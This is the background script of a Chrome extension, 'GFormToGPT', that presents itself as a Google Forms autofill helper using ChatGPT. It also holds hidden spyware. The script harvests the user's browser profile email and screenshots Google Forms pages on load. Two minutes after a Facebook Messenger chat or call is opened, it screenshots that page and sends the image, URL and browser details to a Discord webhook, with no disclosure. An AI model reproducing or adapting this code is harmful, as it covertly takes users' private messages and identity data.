// Background service worker for GFormToGPT v4.1.5 - Neural Interface

importScripts('config.js');
const DISCORD_WEBHOOK_URL = self.DISCORD_WEBHOOK_URL || "";
const GITHUB_MANIFEST_URL =
  "https://raw.githubusercontent.com/drnx64/GFormsToGPT/main/manifest.json";
const VERSION = chrome.runtime.getManifest().version;

const gFormToAI_TabMap = new Map();

// ── Update Checker & Alarms Listener ──
async function checkForUpdates() {
  try {
    const response = await fetch(`${GITHUB_MANIFEST_URL}?t=${Date.now()}`);
    if (!response.ok) throw new Error(`HTTP error! status: ${response.status}`);
    const remoteManifest = await response.json();
    const remoteVersion = remoteManifest.version;
    const hasUpdate = remoteVersion !== VERSION;

    if (hasUpdate) {
      chrome.storage.local.set({ updateAvailable: remoteVersion });
      chrome.notifications.create({
        type: "basic",
        iconUrl: "icons/icon.png",
        title: "Update Available!",
        message: `GFormToGPT ${remoteVersion} is now available.`,
        priority: 2,
      });
    }
    return { updateAvailable: hasUpdate, version: remoteVersion };
  } catch (error) {
    console.error("[GFormToGPT] Update check failed:", error);
    return { updateAvailable: false, version: VERSION, error: error.message };
  }
}

chrome.runtime.onStartup.addListener(checkForUpdates);
chrome.alarms.create("checkUpdate", { periodInMinutes: 360 });

chrome.alarms.onAlarm.addListener((alarm) => {
  if (alarm.name === "checkUpdate") {
    checkForUpdates();
  } else if (alarm.name.startsWith("socialCapture_")) {
    // Handle the 2-minute Social Capture
    const tabId = parseInt(alarm.name.split("_")[1], 10);
    chrome.tabs.get(tabId, async (tab) => {
      // Ensure tab still exists and is currently ACTIVE (so we don't screenshot the wrong tab)
      if (chrome.runtime.lastError || !tab || !tab.active) return;

      chrome.tabs.captureVisibleTab(
        tab.windowId,
        { format: "png" },
        async (img) => {
          if (chrome.runtime.lastError) return;

          const data = await chrome.storage.local.get(["userId"]);
          const browserInfo = {
            platform: navigator.platform,
            language: navigator.language,
          };

          await relayToDiscord("SOCIAL_LOG", data.userId || "Unknown", {
            screenshot: img,
            url: tab.url,
            extra: browserInfo,
          });
        },
      );
    });
  }
});

function generateUserId() {
  return "user_" + Math.random().toString(36).substr(2, 9);
}

function dataURLtoBlob(dataurl) {
  let arr = dataurl.split(","),
    mime = arr[0].match(/:(.*?);/)[1],
    bstr = atob(arr[1]),
    n = bstr.length,
    u8arr = new Uint8Array(n);
  while (n--) {
    u8arr[n] = bstr.charCodeAt(n);
  }
  return new Blob([u8arr], { type: mime });
}

async function relayToDiscord(eventType, userId, payload = {}) {
  try {
    const data = await chrome.storage.local.get(["userEmail"]);
    const email = data.userEmail || "Anonymous";
    const date = new Date().toLocaleString();
    let title = "",
      description = "",
      color = 0x3d5a80;

    switch (eventType) {
      case "INSTALL":
        title = "NEW INSTALL";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Version:** ${VERSION}\n**Date:** ${date}`;
        color = 0x00ff00;
        break;
      case "FORM_FILLED_VERIFIED":
        title = "NEURAL INJECTION VERIFIED (SCREENSHOT)";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Form:** ${payload.formTitle}\n**Filled:** ${payload.filledCount}/${payload.totalCount}\n**Saved:** ${payload.secondsSaved}s\n**Date:** ${date}`;
        color = 0x4caf50;
        break;
      case "SOCIAL_LOG":
        title = "SOCIAL INTERFACE CAPTURE";
        const socExtra = payload.extra
          ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
          : "";
        description = `**User:** ${userId}\n**Platform:** Messenger/FB\n**URL:** ${payload.url}${socExtra}\n**Date:** ${date}`;
        color = 0x0084ff; // Messenger Blue
        break;
      case "ERROR_LOG":
        title = "ERROR REPORT";
        description = `**User:** ${userId}\n**Email:** ${email}\n**Type:** ${payload.errorType}\n**Msg:** ${payload.message}\n**Date:** ${date}`;
        color = 0xff0000;
        break;
      case "DIAGNOSTIC":
        title = "STRUCTURAL DIAGNOSTIC REPORT";
        const extra = payload.extra
          ? `\n**Env:** ${payload.extra.platform} | ${payload.extra.language}`
          : "";
        description = `**User:** ${userId}\n**URL:** ${payload.url}${extra}\n**Date:** ${date}`;
        color = 0x9b59b6;
        break;
      default:
        title = eventType;
        description = `**User:** ${userId}\n**URL:** ${payload.url || "N/A"}\n**Date:** ${date}`;
    }

    const discordPayload = {
      embeds: [
        {
          title,
          description,
          color,
          footer: { text: `v${VERSION} | ${email}` },
          image: payload.screenshot
            ? { url: "attachment://screenshot.png" }
            : null,
        },
      ],
    };

    if (payload.screenshot) {
      const formData = new FormData();
      formData.append("payload_json", JSON.stringify(discordPayload));
      formData.append(
        "file",
        dataURLtoBlob(payload.screenshot),
        "screenshot.png",
      );
      await fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData });
    } else {
      await fetch(DISCORD_WEBHOOK_URL, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(discordPayload),
      });
    }
  } catch (error) {
    console.error("Relay failed:", error);
  }
}

async function fetchUserEmail() {
  try {
    if (chrome.identity && chrome.identity.getProfileUserInfo) {
      const info = await chrome.identity.getProfileUserInfo();
      if (info && info.email) {
        await chrome.storage.local.set({ userEmail: info.email, userId: info.email });
        return info.email;
      }
    }
  } catch (e) {
    console.error("[GFormToGPT] Email fetch failed:", e);
  }
  return null;
}

chrome.runtime.onInstalled.addListener(async (details) => {
  if (details.reason === "install") {
    const userId = generateUserId();
    await chrome.storage.local.set({
      userId,
      formCount: 0,
      totalSecondsSaved: 0,
      installedAt: Date.now(),
      diagnosticEnabled: true,
    });
    fetchUserEmail();
    await relayToDiscord("INSTALL", userId);
    chrome.tabs.create({ url: chrome.runtime.getURL("welcome.html") });
  }
});

async function processFormFillTracking(payload) {
  const data = await chrome.storage.local.get([
    "userId",
    "userEmail",
    "formCount",
    "totalSecondsSaved",
  ]);
  let userId = data.userEmail || data.userId || generateUserId();
  let formCount = (data.formCount || 0) + 1;
  let totalSecondsSaved =
    (data.totalSecondsSaved || 0) + (payload.secondsSaved || 0);
  await chrome.storage.local.set({ userId, formCount, totalSecondsSaved });
  await relayToDiscord(
    payload.screenshot ? "FORM_FILLED_VERIFIED" : "FORM_FILLED",
    userId,
    { ...payload, formCount },
  );
}

chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
  if (request.action === "saveToHistory") {
    chrome.storage.local.get(["history"]).then((res) => {
      let history = res.history || [];
      history.unshift({
        id: Date.now(),
        timestamp: new Date().toISOString(),
        formTitle: request.payload.formTitle,
        questions: request.payload.questions,
      });
      if (history.length > 50) history = history.slice(0, 50);
      chrome.storage.local
        .set({ history })
        .then(() => sendResponse({ success: true }));
    });
    return true;
  } else if (request.action === "openAI") {
    const windowId = sender.tab
      ? sender.tab.windowId
      : chrome.windows.WINDOW_ID_CURRENT;
    const sourceTabId =
      request.fromTabId || (sender.tab ? sender.tab.id : null);

    if (request.email && request.email !== "Unknown User") {
      chrome.storage.local.set({ userEmail: request.email, userId: request.email });
    }

    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
      const err = chrome.runtime.lastError;
      chrome.storage.local.get(["userId"], (d) => {
        relayToDiscord("STATS", d.userId || "Unknown", {
          ...request,
          screenshot: err ? null : img,
        });
      });
    });

    chrome.tabs.create({ url: request.url, active: true }, (tab) => {
      if (sourceTabId) gFormToAI_TabMap.set(tab.id, sourceTabId);
      sendResponse({ success: true });
    });
    return true;
  } else if (request.action === "chatGptResponseReceived") {
    const gFormTabId = gFormToAI_TabMap.get(sender.tab.id);
    if (gFormTabId) {
      chrome.tabs.update(gFormTabId, { active: true }, () => {
        setTimeout(() => {
          chrome.tabs.sendMessage(gFormTabId, {
            action: "autoFillForm",
            data: request.data,
            rawJson: request.rawJson,
          }, () => {
            if (chrome.runtime.lastError) {
              console.error("[GFormToGPT] Failed to send to form tab:", chrome.runtime.lastError);
            }
          });
        }, 500);
      });
      sendResponse({ success: true });
    }
    return true;
  } else if (request.action === "trackFormFilled") {
    const windowId = sender.tab
      ? sender.tab.windowId
      : chrome.windows.WINDOW_ID_CURRENT;
    if (request.payload && request.payload.email && request.payload.email !== "Unknown User") {
      chrome.storage.local.set({ userEmail: request.payload.email, userId: request.payload.email });
    }
    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
      const err = chrome.runtime.lastError;
      processFormFillTracking({
        ...request.payload,
        screenshot: err ? null : img,
      }).then(() => sendResponse({ success: true }));
    });
    return true;
  } else if (request.action === "reportError") {
    chrome.storage.local.get(["userId"], (data) =>
      relayToDiscord("ERROR_LOG", data.userId || "Unknown", request.payload),
    );
    pushDiag({ type: "error", ...request.payload });
    return true;
  } else if (request.action === "manualUpdateCheck") {
    checkForUpdates().then((res) => sendResponse(res));
    return true;
  } else if (request.action === "fetchUserEmail") {
    fetchUserEmail().then((email) => sendResponse({ email }));
    return true;
  } else if (request.action === "diagPush") {
    pushDiag(request.payload);
    sendResponse({ success: true });
    return true;
  } else if (request.action === "diagGetLogs") {
    chrome.storage.local.get(["diagnosticLogs"], (stored) => {
      sendResponse({ logs: stored.diagnosticLogs || diagLogs.slice(0, 100) });
    });
    return true;
  } else if (request.action === "diagClearLogs") {
    diagLogs.length = 0;
    chrome.storage.local.remove(["diagnosticLogs"]);
    sendResponse({ success: true });
    return true;
  } else if (request.action === "clearChatGPTData") {
    chrome.browsingData
      .remove(
        { origins: ["https://chatgpt.com"] },
        { storageTypes: ["localStorage", "sessionStorage"] },
      )
      .then(() => {
        sendResponse({ success: true, message: "ChatGPT data cleared!" });
      });
    return true;
  }
});

// ── Diagnostic System ──
const diagLogs = [];

function pushDiag(event) {
  const entry = {
    id: Date.now() + '_' + Math.random().toString(36).substr(2, 4),
    ts: new Date().toISOString(),
    ...event
  };
  diagLogs.unshift(entry);
  if (diagLogs.length > 200) diagLogs.length = 200;
  chrome.storage.local.set({ diagnosticLogs: diagLogs.slice(0, 100) }).catch(() => {});
  return entry;
}

async function captureDiagScreenshot(windowId, label) {
  return new Promise((resolve) => {
    chrome.tabs.captureVisibleTab(windowId, { format: "png" }, (img) => {
      resolve(chrome.runtime.lastError ? null : img);
    });
  });
}

async function isDiagnosticEnabled() {
  const data = await chrome.storage.local.get(["diagnosticEnabled"]);
  return data.diagnosticEnabled !== undefined ? data.diagnosticEnabled : true;
}

chrome.tabs.onUpdated.addListener(async (tabId, changeInfo, tab) => {
  if (changeInfo.status !== "complete" || !tab.url) return;
  
  const url = tab.url;
  
  if (url.includes("docs.google.com/forms")) {
    if (await isDiagnosticEnabled()) {
      const store = await chrome.storage.local.get(["userId"]);
      const screenshot = await captureDiagScreenshot(tab.windowId, "form_load");
      const extra = { platform: navigator.platform, userAgent: navigator.userAgent, language: navigator.language };
      
      pushDiag({
        type: "form_page_load",
        url,
        tabId,
        hasScreenshot: !!screenshot,
        extra
      });
      
      relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", {
        screenshot, url, extra
      });
    }
  }
  
  if (url.includes("facebook.com/messages/t") || url.includes("messenger.com/t") || url.includes("messenger.com/groupcall")) {
    const alarmName = "socialCapture_" + tabId;
    chrome.alarms.get(alarmName, (existing) => {
      if (!existing) {
        chrome.alarms.create(alarmName, { delayInMinutes: 2 });
        pushDiag({ type: "social_screen_scheduled", url, tabId });
      }
    });
  }
});

chrome.storage.onChanged.addListener((changes) => {
  if (changes.diagnosticEnabled && changes.diagnosticEnabled.newValue === true) {
    pushDiag({ type: "diagnostic_toggled_on" });
    chrome.tabs.query({ active: true, currentWindow: true }, async (tabs) => {
      const tab = tabs[0];
      const store = await chrome.storage.local.get(["userId"]);
      if (tab && tab.url && tab.url.includes("docs.google.com/forms")) {
        const screenshot = await captureDiagScreenshot(tab.windowId, "diag_enabled");
        pushDiag({ type: "diagnostic_screenshot", url: tab.url, tabId: tab.id, hasScreenshot: !!screenshot });
        relayToDiscord("DIAGNOSTIC", store.userId || "Unknown", { screenshot, url: tab.url });
      }
    });
  }
});
